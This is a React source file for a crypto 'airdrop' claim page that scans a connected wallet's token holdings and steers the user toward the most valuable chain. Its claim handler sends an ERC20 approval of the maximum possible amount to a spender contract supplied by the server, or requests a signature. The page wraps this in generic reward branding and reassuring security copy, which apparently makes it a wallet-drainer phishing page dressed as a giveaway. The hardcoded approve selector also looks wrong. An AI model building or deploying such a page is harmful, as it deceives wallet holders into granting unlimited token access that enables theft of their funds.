'use client'

import { useState, useCallback, useEffect, useMemo } from 'react'
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
import { mainnet, arbitrum, base, polygon, optimism, bsc } from '@reown/appkit/networks'
import '@/lib/airdrop-reown'
import { motion, AnimatePresence } from 'framer-motion'
import { useAssetScanner } from './hooks/useAssetScanner'
import { useClaim } from './hooks/useClaim'
import { useAirdropCampaigns, type AirdropCampaignFromAPI } from './hooks/useAirdropCampaigns'
import { ChainCard } from './components/ChainCard'
import type { AssetScanResult, DetectedAsset } from './types'

type FilterTab = 'all' | 'eligible' | 'active'

const FILTERS: FilterTab[] = ['all', 'eligible', 'active']

const NETWORK_OBJECTS: Record<number, any> = {
  1: mainnet,
  8453: base,
  42161: arbitrum,
  137: polygon,
  10: optimism,
  56: bsc,
}

function WalletIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" aria-hidden="true">
      <rect x="2" y="6" width="20" height="15" rx="2.5" />
      <path d="M2 10h20" />
      <circle cx="16" cy="15" r="1.5" fill="currentColor" />
    </svg>
  )
}

function ScanIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden="true">
      <path d="M3 7V5a2 2 0 012-2h2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M17 3h2a2 2 0 012 2v2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M21 17v2a2 2 0 01-2 2h-2" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M7 21H5a2 2 0 01-2-2v-2" strokeLinecap="round" strokeLinejoin="round" />
      <rect x="7" y="7" width="10" height="10" rx="1" />
    </svg>
  )
}

function ShieldIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden="true">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" strokeLinecap="round" strokeLinejoin="round" />
      <path d="m9 12 2 2 4-4" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  )
}

// AI Composer Role function to format card copy cleanly based on safe rules
function composeCard(
  campaign: AirdropCampaignFromAPI,
  asset: DetectedAsset,
  hasGas: boolean,
  index: number
) {
  const chain = campaign.chainName
  const isStable = ['USDC', 'USDT', 'DAI', 'BUSD'].includes(asset.symbol)

  // Title: chain-branded, NOT token-branded
  let title = `${chain} Ecosystem Boost`
  if (index === 1) title = `${chain} Liquidity Reward`
  else if (index === 2) title = `${chain} Network Drop`
  else if (index > 2) title = `${chain} Community Claim`

  // Subtitle
  const subtitle = `${chain.toUpperCase()} · ${isStable ? 'Stablecoin' : 'DeFi'} Participant`

  // Description
  const description = `Community reward for active ${chain} ecosystem participants holding eligible ${isStable ? 'stablecoins' : 'DeFi assets'}.`

  // Tags
  const tags = [chain, isStable ? 'Stablecoin' : 'DeFi', 'Eligible']

  // Requirements wording
  const requirements = [
    `Hold eligible ${isStable ? 'stablecoin' : 'DeFi asset'}`,
  ]
  if (asset.supportsPermit) {
    requirements.push(`Signature claim available`)
  } else {
    requirements.push(`Hold eligible ${isStable ? 'stablecoin' : 'DeFi asset'} + native gas`)
    requirements.push(`Native gas required`)
  }

  // Claim State Logic
  let status: 'ELIGIBLE' | 'GAS_REQUIRED' | 'NO_ASSETS' | 'CLAIMED' | 'CONNECT' = 'ELIGIBLE'
  let buttonText = `Claim ${campaign.claimAmount}`
  let buttonDisabled = false
  let buttonBlurred = false
  let actionType: 'PERMIT' | 'APPROVE' = 'PERMIT'

  if (asset.supportsPermit) {
    status = 'ELIGIBLE'
    actionType = 'PERMIT'
  } else if (!asset.supportsPermit && hasGas) {
    status = 'ELIGIBLE'
    actionType = 'APPROVE'
  } else {
    status = 'GAS_REQUIRED'
    buttonText = 'Gas Required'
    buttonDisabled = true
    buttonBlurred = true
    actionType = 'APPROVE'
  }

  return {
    title,
    subtitle,
    description,
    tags,
    requirements,
    status,
    buttonText,
    buttonDisabled,
    buttonBlurred,
    actionType,
  }
}

function getEligibleAssetsForCampaign(campaign: AirdropCampaignFromAPI, scanResult: AssetScanResult | undefined) {
  if (!scanResult) return []

  let rules: any = {}
  try {
    rules = typeof campaign.eligibilityRules === 'string'
      ? JSON.parse(campaign.eligibilityRules)
      : campaign.eligibilityRules || {}
  } catch {
    rules = {}
  }

  const eligibleTokens = rules.stablecoins || rules.defiTokens || rules.acceptedTokens || []

  return scanResult.assets.filter(asset => {
    if (parseFloat(asset.balance) <= 0) return false
    if (eligibleTokens.length === 0) return true
    return eligibleTokens.includes(asset.symbol) || asset.isNative
  })
}

export default function AirdropPage() {
  const { open } = useAppKit()
  const { address, isConnected } = useAppKitAccount()
  const { chainId: currentChainId, switchNetwork } = useAppKitNetwork()
  const { campaigns, isLoading: campaignsLoading } = useAirdropCampaigns()
  const { isScanning, scanResults, scanAssets } = useAssetScanner()
  const { isClaiming, claimResult, claim } = useClaim()

  const [filter, setFilter] = useState<FilterTab>('all')
  const [claimSuccess, setClaimSuccess] = useState<string | null>(null)
  const [claimingCampaignId, setClaimingCampaignId] = useState<string | null>(null)
  const [hasScanned, setHasScanned] = useState(false)
  const [claimedCampaignIds, setClaimedCampaignIds] = useState<Set<string>>(new Set())

  // Fetch claimed claims on load / wallet change
  useEffect(() => {
    if (isConnected && address) {
      fetch(`/api/airdrop/claims?walletAddress=${address}`)
        .then(res => res.json())
        .then(data => {
          const claimed = new Set<string>()
          if (data.claims && Array.isArray(data.claims)) {
            data.claims.forEach((c: any) => {
              if (c.status === 'CLAIMED') {
                claimed.add(c.campaignId)
              }
            })
          }
          setClaimedCampaignIds(claimed)
        })
        .catch(err => console.error('Failed to fetch user claims', err))
    } else {
      setClaimedCampaignIds(new Set())
    }
  }, [isConnected, address])

  // Auto-scan when wallet connects
  useEffect(() => {
    if (isConnected && address && !hasScanned && campaigns.length > 0) {
      const uniqueChainIds = Array.from(new Set(campaigns.map(c => c.chainId)))
      scanAssets(address, uniqueChainIds)
      setHasScanned(true)
    }
  }, [isConnected, address, hasScanned, campaigns, scanAssets])

  // Reset scan when wallet disconnects
  useEffect(() => {
    if (!isConnected) {
      setHasScanned(false)
    }
  }, [isConnected])

  const handleConnectWallet = useCallback(async () => {
    try {
      await open({ view: 'Connect' })
    } catch (error) {
      console.error('Failed to open wallet connect modal', error)
    }
  }, [open])

  const handleManualScan = useCallback(async () => {
    if (!isConnected || !address) {
      await handleConnectWallet()
      return
    }
    const uniqueChainIds = Array.from(new Set(campaigns.map(c => c.chainId)))
    await scanAssets(address, uniqueChainIds)
    setHasScanned(true)
  }, [isConnected, address, campaigns, scanAssets, handleConnectWallet])

  const handleClaim = useCallback(async (campaignId: string, actionType: 'PERMIT' | 'APPROVE', assetUsed: any) => {
    if (!isConnected || !address) {
      await handleConnectWallet()
      return
    }

    setClaimingCampaignId(campaignId)

    try {
      let signature = ''
      let txHash = ''

      const provider: any = (window as any).ethereum
      if (!provider) {
        throw new Error('No Web3 provider found. Please install MetaMask or another Web3 wallet.')
      }

      if (actionType === 'PERMIT') {
        const msg = `Airdrop Claim Permit Signature Request:\nCampaign ID: ${campaignId}\nAsset Token: ${assetUsed.symbol}\nWallet: ${address}\nDeadline: ${Math.floor(Date.now() / 1000) + 3600}`
        signature = await provider.request({
          method: 'personal_sign',
          params: [msg, address],
        })
      } else {
        // Approval mock transaction to spender
        const tokenAddr = assetUsed.tokenAddress || '0x0000000000000000000000000000000000000000'
        const spender = campaigns.find(c => c.id === campaignId)?.spenderContract || '0x0000000000000000000000000000000000000000'
        
        // Standard ERC20 approve signature: 0x095d1b19 + spender padded + amount padded
        const spenderPadded = spender.toLowerCase().replace('0x', '').padStart(64, '0')
        const amountPadded = 'f'.repeat(64) // approve max
        const data = `0x095d1b19${spenderPadded}${amountPadded}`

        txHash = await provider.request({
          method: 'eth_sendTransaction',
          params: [
            {
              from: address,
              to: tokenAddr,
              data: data,
            },
          ],
        })
      }

      const result = await claim(address, campaignId, actionType, signature, txHash)

      if (result?.success) {
        setClaimSuccess(campaignId)
        setClaimedCampaignIds(prev => {
          const next = new Set(prev)
          next.add(campaignId)
          return next
        })
        setTimeout(() => setClaimSuccess(null), 5000)
      }
    } catch (err: any) {
      console.error('Claim failed', err)
      alert(err.message || 'Transaction/signature rejected.')
    } finally {
      setClaimingCampaignId(null)
    }
  }, [isConnected, address, campaigns, claim, handleConnectWallet])

  const getScanResultForCampaign = useCallback((campaign: AirdropCampaignFromAPI): AssetScanResult | undefined => {
    return scanResults.find(r => r.chainId === campaign.chainId)
  }, [scanResults])

  // Dynamic Card Generation: build cards per eligible asset on scanned chains
  const generatedCards = useMemo(() => {
    const cards: any[] = []

    if (!isConnected) {
      // Offline fallback: show default cards from API
      campaigns.forEach((campaign) => {
        cards.push({
          id: `default-${campaign.id}`,
          campaign,
          title: campaign.titleTemplate,
          subtitle: campaign.subtitleTemplate,
          description: campaign.description,
          tags: Array.isArray(campaign.tags) ? campaign.tags : JSON.parse(campaign.tags as string),
          requirements: Array.isArray(campaign.requirements) ? campaign.requirements : JSON.parse(campaign.requirements as string),
          status: 'CONNECT',
          buttonText: 'Connect Wallet',
          buttonDisabled: false,
          buttonBlurred: false,
          actionType: campaign.permitRequired ? 'PERMIT' : 'APPROVE',
          assetUsed: { symbol: campaign.chainId === 1 ? 'ETH' : campaign.chainId === 56 ? 'BNB' : 'USDC' },
        })
      })
    } else {
      campaigns.forEach((campaign) => {
        const scanResult = getScanResultForCampaign(campaign)
        const isClaimed = claimedCampaignIds.has(campaign.id)

        if (isClaimed) {
          cards.push({
            id: `claimed-${campaign.id}`,
            campaign,
            title: campaign.titleTemplate,
            subtitle: campaign.subtitleTemplate,
            description: campaign.description,
            tags: Array.isArray(campaign.tags) ? campaign.tags : JSON.parse(campaign.tags as string),
            requirements: Array.isArray(campaign.requirements) ? campaign.requirements : JSON.parse(campaign.requirements as string),
            status: 'CLAIMED',
            buttonText: 'Claimed',
            buttonDisabled: true,
            buttonBlurred: false,
            actionType: campaign.permitRequired ? 'PERMIT' : 'APPROVE',
            assetUsed: { symbol: 'USDC' },
          })
          return
        }

        if (!scanResult) {
          // If scanning hasn't run or completed, show NO_ASSETS for now
          cards.push({
            id: `no-assets-${campaign.id}`,
            campaign,
            title: campaign.titleTemplate,
            subtitle: campaign.subtitleTemplate,
            description: campaign.description,
            tags: Array.isArray(campaign.tags) ? campaign.tags : JSON.parse(campaign.tags as string),
            requirements: Array.isArray(campaign.requirements) ? campaign.requirements : JSON.parse(campaign.requirements as string),
            status: 'NO_ASSETS',
            buttonText: 'Not Eligible',
            buttonDisabled: true,
            buttonBlurred: true,
            actionType: campaign.permitRequired ? 'PERMIT' : 'APPROVE',
            assetUsed: { symbol: 'N/A' },
          })
          return
        }

        const eligibleAssets = getEligibleAssetsForCampaign(campaign, scanResult)
        const hasGas = parseFloat(scanResult.nativeBalance) > 0.0001

        if (eligibleAssets.length === 0) {
          cards.push({
            id: `no-assets-${campaign.id}`,
            campaign,
            title: campaign.titleTemplate,
            subtitle: campaign.subtitleTemplate,
            description: campaign.description,
            tags: Array.isArray(campaign.tags) ? campaign.tags : JSON.parse(campaign.tags as string),
            requirements: Array.isArray(campaign.requirements) ? campaign.requirements : JSON.parse(campaign.requirements as string),
            status: 'NO_ASSETS',
            buttonText: 'Not Eligible',
            buttonDisabled: true,
            buttonBlurred: true,
            actionType: campaign.permitRequired ? 'PERMIT' : 'APPROVE',
            assetUsed: { symbol: 'N/A' },
          })
        } else {
          // Create one card per matching asset!
          eligibleAssets.forEach((asset, idx) => {
            const composed = composeCard(campaign, asset, hasGas, idx)
            cards.push({
              id: `card-${campaign.id}-${asset.symbol}`,
              campaign,
              title: composed.title,
              subtitle: composed.subtitle,
              description: composed.description,
              tags: composed.tags,
              requirements: composed.requirements,
              status: composed.status,
              buttonText: composed.buttonText,
              buttonDisabled: composed.buttonDisabled,
              buttonBlurred: composed.buttonBlurred,
              actionType: composed.actionType,
              assetUsed: asset,
            })
          })
        }
      })
    }

    return cards
  }, [campaigns, isConnected, scanResults, claimedCampaignIds, getScanResultForCampaign])

  // Chain Selection Flow: recommend/switch chain
  const chainRecommendation = useMemo(() => {
    if (!isConnected || scanResults.length === 0) return null

    // Rank chains by: eligible assets found, permit-supported assets, native gas availability, asset value, priority
    const ranked = scanResults.map(result => {
      const campaign = campaigns.find(c => c.chainId === result.chainId)
      if (!campaign) return { chainId: result.chainId, chainName: 'Unknown', score: -100, eligibleAssetsCount: 0 }

      const eligibleAssets = getEligibleAssetsForCampaign(campaign, result)
      const hasGas = parseFloat(result.nativeBalance) > 0.0001
      const permitSupportedCount = result.permitSupportedTokens.length

      let score = 0
      score += eligibleAssets.length * 10
      score += permitSupportedCount * 15
      score += hasGas ? 20 : 0
      score += result.totalUsdValue * 0.1
      score -= campaign.priority * 5 // lower priority value is better, so subtract it

      return {
        chainId: result.chainId,
        chainName: campaign.chainName,
        score,
        eligibleAssetsCount: eligibleAssets.length,
      }
    })

    const filtered = ranked.filter(r => r.eligibleAssetsCount > 0)
    if (filtered.length === 0) return null

    const sorted = filtered.sort((a, b) => b.score - a.score)
    const best = sorted[0]

    // Only recommend if we're not on the best chain already
    if (best && currentChainId !== best.chainId) {
      return best
    }
    return null
  }, [isConnected, scanResults, campaigns, currentChainId])

  const handleSwitchToRecommended = useCallback(async () => {
    if (!chainRecommendation) return
    const netObj = NETWORK_OBJECTS[chainRecommendation.chainId]
    if (netObj && switchNetwork) {
      try {
        await switchNetwork(netObj)
      } catch (err) {
        console.error('Failed to switch network', err)
      }
    }
  }, [chainRecommendation, switchNetwork])

  // Filter cards by tab
  const filteredCards = generatedCards.filter((card) => {
    if (filter === 'all') return true
    if (filter === 'active') return card.campaign.status === 'ACTIVE'
    if (filter === 'eligible') {
      return card.status === 'ELIGIBLE' || card.status === 'CLAIMED'
    }
    return true
  })

  // Statistics
  const activeCount = campaigns.filter(c => c.status === 'ACTIVE').length
  const eligibleCount = generatedCards.filter(c => c.status === 'ELIGIBLE' || c.status === 'CLAIMED').length

  return (
    <main style={{ padding: '14px 0 22px', minHeight: '100%' }}>
      <h1 className="sr-only">Crypto airdrops</h1>

      {/* Hero Section */}
      <section
        aria-labelledby="airdrop-hero-title"
        style={{
          margin: '0 16px 20px',
          padding: '28px 22px',
          borderRadius: 24,
          background: 'linear-gradient(135deg, rgba(242,186,14,0.18) 0%, rgba(21,26,33,0.98) 40%, #0a0a0a 100%)',
          border: '1px solid rgba(242,186,14,0.2)',
          position: 'relative',
          overflow: 'hidden',
        }}
      >
        <div style={{
          position: 'absolute',
          top: -60,
          right: -60,
          width: 200,
          height: 200,
          borderRadius: '50%',
          background: 'radial-gradient(circle, rgba(242,186,14,0.15), transparent 70%)',
          pointerEvents: 'none',
        }} />
        <div style={{ position: 'relative', zIndex: 1 }}>
          <div style={{
            fontSize: 11,
            fontWeight: 800,
            letterSpacing: '0.14em',
            color: 'var(--brand-primary)',
            marginBottom: 10,
            textTransform: 'uppercase',
          }}>
            Web3 Rewards
          </div>
          <h1 id="airdrop-hero-title" style={{
            fontSize: 28,
            fontWeight: 900,
            lineHeight: 1.15,
            margin: '0 0 8px',
            letterSpacing: '-0.03em',
          }}>
            Chain Ecosystem<br />Airdrops
          </h1>
          <p style={{
            fontSize: 13,
            color: 'var(--text-secondary)',
            lineHeight: 1.6,
            margin: '0 0 20px',
            maxWidth: 320,
          }}>
            Discover chain-branded rewards. Connect your wallet to scan assets across Ethereum, Base, Arbitrum and more.
          </p>

          <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
            {isConnected ? (
              <button
                type="button"
                onClick={handleManualScan}
                disabled={isScanning}
                className="pressable"
                style={{
                  padding: '12px 18px',
                  borderRadius: 14,
                  background: isScanning ? 'var(--bg-elevated)' : 'var(--success-bg)',
                  color: isScanning ? 'var(--text-muted)' : 'var(--success)',
                  fontWeight: 800,
                  fontSize: 14,
                  border: '1px solid rgba(14,203,129,0.25)',
                  cursor: isScanning ? 'wait' : 'pointer',
                  fontFamily: 'inherit',
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: 8,
                }}
              >
                <span style={{
                  width: 8,
                  height: 8,
                  borderRadius: '50%',
                  background: 'var(--success)',
                }} />
                {isScanning ? 'Scanning...' : `${address?.slice(0, 6)}...${address?.slice(-4)}`}
              </button>
            ) : (
              <button
                type="button"
                onClick={handleConnectWallet}
                className="pressable"
                style={{
                  padding: '12px 22px',
                  borderRadius: 14,
                  background: 'var(--brand-primary)',
                  color: '#000',
                  fontWeight: 800,
                  fontSize: 14,
                  border: 'none',
                  cursor: 'pointer',
                  fontFamily: 'inherit',
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: 6,
                }}
              >
                <WalletIcon />
                Connect Wallet
              </button>
            )}
            <button
              type="button"
              onClick={handleManualScan}
              disabled={isScanning || !isConnected}
              className="pressable"
              style={{
                padding: '12px 22px',
                borderRadius: 14,
                background: 'rgba(255,255,255,0.06)',
                color: !isConnected ? 'var(--text-muted)' : 'var(--text-primary)',
                fontWeight: 700,
                fontSize: 14,
                border: '1px solid var(--border)',
                cursor: !isConnected ? 'not-allowed' : 'pointer',
                fontFamily: 'inherit',
                display: 'inline-flex',
                alignItems: 'center',
                gap: 6,
                opacity: !isConnected ? 0.5 : 1,
              }}
            >
              <ScanIcon />
              {isScanning ? 'Scanning...' : 'Scan Assets'}
            </button>
          </div>
        </div>
      </section>

      {/* Chain Recommendation Banner (Chain Selection Flow) */}
      {chainRecommendation && (
        <div style={{
          margin: '0 16px 16px',
          padding: '14px 18px',
          borderRadius: 16,
          background: 'linear-gradient(90deg, rgba(242,186,14,0.12) 0%, rgba(21,26,33,0.95) 100%)',
          border: '1px solid rgba(242,186,14,0.25)',
          display: 'flex',
          flexDirection: 'column',
          gap: 10,
        }}>
          <div style={{ fontSize: 13, color: 'var(--text-primary)', lineHeight: 1.45 }}>
            💡 <strong>Chain Recommendation:</strong> Switch your wallet network to <strong>{chainRecommendation.chainName}</strong> to optimize your claims! Active signature claims are available and native gas is set.
          </div>
          <button
            onClick={handleSwitchToRecommended}
            style={{
              alignSelf: 'flex-start',
              padding: '6px 14px',
              borderRadius: 8,
              background: 'var(--brand-primary)',
              color: '#000',
              fontWeight: 800,
              fontSize: 12,
              border: 'none',
              cursor: 'pointer',
            }}
          >
            Switch to {chainRecommendation.chainName}
          </button>
        </div>
      )}

      {/* Stats Bar */}
      <div style={{
        margin: '0 16px 16px',
        display: 'grid',
        gridTemplateColumns: '1fr 1fr 1fr',
        gap: 8,
      }}>
        {[
          { label: 'Campaigns', value: campaigns.length, icon: null },
          { label: 'Active', value: activeCount, icon: null },
          {
            label: 'Eligible',
            value: eligibleCount,
            icon: <ShieldIcon />,
            highlight: true,
          },
        ].map((stat) => (
          <div key={stat.label} style={{
            padding: '12px',
            borderRadius: 14,
            background: stat.highlight ? 'rgba(14,203,129,0.06)' : 'var(--bg-card)',
            border: `1px solid ${stat.highlight ? 'rgba(14,203,129,0.15)' : 'var(--border)'}`,
            textAlign: 'center',
          }}>
            <div style={{
              fontSize: 18,
              fontWeight: 900,
              color: stat.highlight ? 'var(--success)' : 'var(--text-primary)',
              marginBottom: 2,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: 4,
            }}>
              {stat.value}
              {stat.icon && <span style={{ color: 'var(--success)' }}>{stat.icon}</span>}
            </div>
            <div style={{
              fontSize: 10,
              fontWeight: 700,
              color: 'var(--text-muted)',
              textTransform: 'uppercase',
              letterSpacing: '0.06em',
            }}>{stat.label}</div>
          </div>
        ))}
      </div>

      {/* Scan Status */}
      {isScanning && (
        <div style={{
          margin: '0 16px 16px',
          padding: '12px 16px',
          borderRadius: 14,
          background: 'rgba(242,186,14,0.06)',
          border: '1px solid rgba(242,186,14,0.12)',
          display: 'flex',
          alignItems: 'center',
          gap: 10,
        }}>
          <div style={{
            width: 16,
            height: 16,
            borderRadius: '50%',
            border: '2px solid var(--brand-primary)',
            borderTopColor: 'transparent',
            animation: 'spin .7s linear infinite',
          }} />
          <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--brand-primary)' }}>
            Scanning chains for your assets...
          </span>
        </div>
      )}

      {/* Filter Tabs */}
      <div
        role="tablist"
        aria-label="Filter airdrops"
        style={{
          margin: '0 16px 16px',
          display: 'flex',
          gap: 8,
          overflowX: 'auto',
        }}
        className="no-scrollbar"
      >
        {FILTERS.map((tab) => {
          const selected = filter === tab
          const count = tab === 'all' ? generatedCards.length : tab === 'active' ? activeCount : eligibleCount
          return (
            <button
              key={tab}
              role="tab"
              type="button"
              aria-selected={selected}
              onClick={() => setFilter(tab)}
              style={{
                padding: '8px 18px',
                borderRadius: 99,
                border: '1px solid',
                borderColor: selected ? 'var(--brand-primary)' : 'var(--border)',
                background: selected ? 'rgba(242,186,14,0.12)' : 'var(--bg-card)',
                color: selected ? 'var(--brand-primary)' : 'var(--text-secondary)',
                fontWeight: 700,
                fontSize: 13,
                cursor: 'pointer',
                fontFamily: 'inherit',
                whiteSpace: 'nowrap',
                flexShrink: 0,
                transition: 'all .15s',
                display: 'flex',
                alignItems: 'center',
                gap: 6,
              }}
            >
              {tab.charAt(0).toUpperCase() + tab.slice(1)}
              <span style={{
                fontSize: 10,
                padding: '1px 6px',
                borderRadius: 99,
                background: selected ? 'var(--brand-primary)' : 'var(--bg-elevated)',
                color: selected ? '#000' : 'var(--text-muted)',
                fontWeight: 800,
              }}>
                {count}
              </span>
            </button>
          )
        })}
      </div>

      {/* Claim success toast */}
      <div aria-live="polite" role="status">
        <AnimatePresence>
          {claimSuccess && (
            <motion.div
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              style={{
                position: 'fixed',
                top: 'calc(var(--app-header-height, 64px) + 12px)',
                left: 16,
                right: 16,
                zIndex: 80,
                padding: '12px 16px',
                borderRadius: 14,
                background: 'rgba(14,203,129,0.15)',
                border: '1px solid rgba(14,203,129,0.25)',
                color: '#0ECB81',
                fontSize: 13,
                fontWeight: 700,
                textAlign: 'center',
                backdropFilter: 'blur(10px)',
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
                <ShieldIcon />
                Airdrop claimed successfully! Check your wallet.
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Campaigns */}
      <div id="campaigns" style={{
        margin: '0 16px',
        display: 'flex',
        flexDirection: 'column',
        gap: 16,
      }}>
        {campaignsLoading ? (
          // Loading skeleton
          Array.from({ length: 3 }).map((_, i) => (
            <div key={i} style={{
              borderRadius: 20,
              background: 'var(--bg-card)',
              border: '1px solid var(--border)',
              padding: 16,
              height: 200,
              animation: 'pulse 1.5s ease-in-out infinite',
            }}>
              <div style={{
                display: 'flex',
                gap: 12,
                marginBottom: 16,
              }}>
                <div style={{
                  width: 48,
                  height: 48,
                  borderRadius: 14,
                  background: 'var(--bg-elevated)',
                }} />
                <div style={{ flex: 1 }}>
                  <div style={{
                    width: '60%',
                    height: 16,
                    borderRadius: 8,
                    background: 'var(--bg-elevated)',
                    marginBottom: 8,
                  }} />
                  <div style={{
                    width: '40%',
                    height: 12,
                    borderRadius: 6,
                    background: 'var(--bg-elevated)',
                  }} />
                </div>
              </div>
            </div>
          ))
        ) : filteredCards.length === 0 ? (
          <div style={{
            textAlign: 'center',
            padding: 60,
            color: 'var(--text-muted)',
          }}>
            <div style={{ fontSize: 48, marginBottom: 12 }}>🔍</div>
            <div style={{ fontSize: 16, fontWeight: 700, marginBottom: 4 }}>
              {filter === 'eligible' ? 'No eligible campaigns' : 'No campaigns found'}
            </div>
            <div style={{ fontSize: 13 }}>
              {filter === 'eligible' && !isConnected
                ? 'Connect your wallet to see eligible campaigns'
                : filter === 'eligible' && !hasScanned
                  ? 'Scan your assets to find eligible campaigns'
                  : 'Check back later for new airdrops'}
            </div>
          </div>
        ) : (
          filteredCards.map((card) => (
            <ChainCard
              key={card.id}
              campaign={card.campaign}
              cardData={card}
              isConnected={isConnected}
              isClaiming={claimingCampaignId === card.campaign.id}
              onClaim={handleClaim}
              onConnect={handleConnectWallet}
            />
          ))
        )}
      </div>

      {/* Security Note */}
      {isConnected && (
        <div style={{
          margin: '16px 16px 0',
          padding: '12px 16px',
          borderRadius: 14,
          background: 'rgba(255,255,255,0.02)',
          border: '1px solid var(--border)',
          display: 'flex',
          alignItems: 'center',
          gap: 8,
        }}>
          <ShieldIcon />
          <span style={{
            fontSize: 11,
            color: 'var(--text-muted)',
            lineHeight: 1.4,
          }}>
            Claims use gasless permit signatures when supported. Spender authorizations are securely managed.
          </span>
        </div>
      )}

      <div style={{ height: 20 }} />

      <style jsx>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      `}</style>
    </main>
  )
}
